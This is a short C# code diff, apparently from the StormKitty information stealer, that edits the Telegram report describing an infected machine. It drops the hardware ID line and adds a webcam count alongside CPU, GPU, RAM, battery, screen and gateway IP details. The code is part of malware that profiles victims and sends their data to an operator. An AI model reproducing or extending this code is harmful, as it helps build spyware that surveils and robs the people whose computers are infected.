@@ -169,9 +169,9 @@ namespace StormKitty.Telegram
                 + "\nCPU: " + SystemInfo.GetCPUName()
                 + "\nGPU: " + SystemInfo.GetGPUName()
                 + "\nRAM: " + SystemInfo.GetRamAmount()
-                + "\nHWID: " + SystemInfo.GetHardwareID()
                 + "\nPower: " + SystemInfo.GetBattery()
                 + "\nScreen: " + SystemInfo.ScreenMetrics()
+                + "\nWebcams count: " + WebcamScreenshot.GetConnectedCamerasCount()
                 + "\n"
                 + "\n  📡 *Network:* "
                 + "\nGateway IP: " + SystemInfo.GetDefaultGateway()
